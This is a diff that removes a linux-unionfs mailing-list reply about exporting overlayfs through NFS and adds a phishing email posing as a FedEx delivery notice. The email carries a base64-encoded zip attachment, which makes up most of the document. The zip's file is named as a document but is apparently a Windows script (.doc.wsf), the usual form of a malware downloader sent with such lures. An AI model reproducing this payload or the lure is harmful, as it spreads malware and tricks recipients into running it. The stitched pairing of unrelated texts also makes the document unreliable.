@@ -1,126 +1,406 @@
-From: Amir Goldstein <amir73il@gmail.com>
-Subject: Re: Exporting overlay via NFS?
-Date: Wed, 12 Oct 2016 21:40:53 +0300
-Message-ID: <CAOQ4uxjR8q2X=q8=-JnU8QiE6a8F4SXUyzjq9_EZeDTy0=qR4g@mail.gmail.com>
-References: <20161012142904.GB10902@otheros>
+From: "FedEx 2Day A.M." <theodore.mckay@tomasfoto.eu>
+Subject: Problems with item delivery, n.0000656601
+Date: Thu, 13 Oct 2016 01:43:59 +0200
+Message-ID: <0f4b4de5b5df579875abeea6025ca024@tomasfoto.eu>
+Reply-To: "FedEx 2Day A.M." <theodore.mckay@tomasfoto.eu>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
+Content-Type: multipart/mixed;
+        boundary="b1_98b6392f89f35668fa1a12fd23814390"
+Content-Transfer-Encoding: 8bit
 Return-path: <linux-unionfs-owner@vger.kernel.org>
-Received: from mail-qk0-f172.google.com ([209.85.220.172]:34803 "EHLO
-        mail-qk0-f172.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S933991AbcJLSk4 (ORCPT
+Received: from smtpout4.dnsserver.eu ([92.240.253.63]:18263 "EHLO
+        smtpout4.dnsserver.eu" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S933578AbcJMBcW (ORCPT
         <rfc822;linux-unionfs@vger.kernel.org>);
-        Wed, 12 Oct 2016 14:40:56 -0400
-Received: by mail-qk0-f172.google.com with SMTP id f128so45564936qkb.1
-        for <linux-unionfs@vger.kernel.org>; Wed, 12 Oct 2016 11:40:55 -0700 (PDT)
-In-Reply-To: <20161012142904.GB10902@otheros>
+        Wed, 12 Oct 2016 21:32:22 -0400
+Received: from [92.240.253.8] (helo=web3s9.dnsserver.eu)
+        by smtpout4.dnsserver.eu with esmtp (Exim 4.84 (FreeBSD))
+        (envelope-from <theodore.mckay@tomasfoto.eu>)
+        id 1buTBu-0009Ef-M5
+        for linux-unionfs@vger.kernel.org; Thu, 13 Oct 2016 01:44:06 +0200
+Received: from web253s158.dnsserver.eu ([92.240.253.158] helo=dnsserver.eu)
+        by web3s9.dnsserver.eu with smtp (Exim 4.86 (FreeBSD))
+        (envelope-from <theodore.mckay@tomasfoto.eu>)
+        id 1buTBp-000PZt-6a
+        for linux-unionfs@vger.kernel.org; Thu, 13 Oct 2016 01:44:06 +0200
 Sender: linux-unionfs-owner@vger.kernel.org
 List-Id: linux-unionfs@vger.kernel.org
-To: =?UTF-8?Q?Linus_L=C3=BCssing?= <linus.luessing@c0d3.blue>
-Cc: linux-unionfs@vger.kernel.org
+To: linux-unionfs@vger.kernel.org
 
-On Wed, Oct 12, 2016 at 5:29 PM, Linus L=C3=BCssing <linus.luessing@c0d3.bl=
-ue> wrote:
-> Hi,
->
-> I'm currently trying to spice up an NFS share by adding an overlay
-> fs layer.
->
-> As I only found a note regarding issues with using an overlay on
-> the NFS client side in Documentation/filesystems/overlayfs.txt,
-> I thought I'd ask about the NFS server side here.
->
->
-> Instead of booting from a /srv/nfs/debian-sid/.amd64,
-> I want to boot from an overlay like:
->
-> /srv/nfs/debian-sid/.amd64 + /srv/nfs/debian-sid/overlay
-> =3D /srv/nfs/debian-sid/amd64
->
-> This overlay is constructed on the NFS server side.
->
->
-> Without this overlay, things work for me:
->
-> /etc/exports:
->         /srv/nfs *(ro,async,no_root_squash)
->
-> And mounting that with a kernel parameter like:
->         ... ro root=3D/dev/nfs net.ifnames=3D0 ip=3D:::::eth0:dhcp \
->         nfsroot=3D172.23.208.16:/srv/nfs/debian-sid/.amd64 ...
->
-> As well as some more overlay magic in the initrd on the client
-> side to add a tmpfs over the read-only NFS share. This part works
-> so far.
->
->
-> Now I'm trying to add an overlayfs on the NFS server side too,
-> as described above. Unfortunately, this fails on the
-> nfs-root-booting client side:
->
-> ~~~
-> [...]
-> mount call failed - server replied: Permission denied.
-> Begin: Retrying nfs mount ... mount call failed - server replied: Permiss=
-ion denied.
-> done.
-> Begin: Retrying nfs mount ... mount call failed - server replied: Permiss=
-ion denied.
-> done.
-> [...]
-> ~~~
->
->
-> I also tried changing the export from /srv/nfs to
-> /srv/nfs/debian-sid/amd64, but I still get the permission denied.
-> The overlay /srv/nfs/debian-sid/amd64 looks fine and with an empty
-> /srv/nfs/debian-sid/overlay directory identical to the .amd64 one.
->
->
-> NFS server side runs a Debian Jessie with a 4.7.0-0.bpo.1-amd64
-> kernel. The NFS client side runs a 4.7 kernel, too, and is
-> supposed to boot a Debian Sid.
->
->
-> Any idea why this permission denied might happen?
->
+--b1_98b6392f89f35668fa1a12fd23814390
+Content-Type: text/plain; charset=us-ascii
 
-You should be examining kmsg of the server machine.
-Not sure why the client gets a Permission denied error, but the fact is tha=
-t
-exporting overlayfs is not supported.
+Dear Customer,
 
-I suppose that is all you wanted to know, but while I'm at it, I'll continu=
-e
-the "what if" line of though.
 
-check_export() in fs/nfsd/export.c says:
 
-        /* There are two requirements on a filesystem to be exportable.
-         * 1:  We must be able to identify the filesystem from a number.
-         *       either a device number (so FS_REQUIRES_DEV needed)
-         *       or an FSID number (so NFSEXP_FSID or ->uuid is needed).
-         * 2:  We must be able to find an inode from a filehandle.
-         *       This means that s_export_op must be set.
-         */
+This is to confirm that one or more of your parcels has been shipped.
 
-overlayfs does not qualify for the first requirement, which is hard to
-fix, but can be circumvented from userspace.
+Shipment Label is attached to email.
 
-overlayfs does not qualify for the second requirement either, which is wher=
-e
-things get interesting.. although the general case of any overlay combinati=
-on
-is hard to fix, there is a simpler case of lower and upper on the same sb
-and that sb has s_export_op (which is the case in your setup).
 
-In that case, I think it shouldn't be too hard to implement the export ops.
-The question is what happens after copy-up.
-My first instinct is to always identify the inode by lower inode handle,
-unless it is a pure upper, same approach that Miklos took in recent patch
-  ovl: make directory ino/dev numbers stable
 
-If there is interest I could probably look into this.
+Regards,
 
-Amir.
+Theodore Mckay,
+
+FedEx Delivery Agent.
+
+
+--b1_98b6392f89f35668fa1a12fd23814390
+Content-Type: application/zip; name="0000656601.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=0000656601.zip
+
+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
+
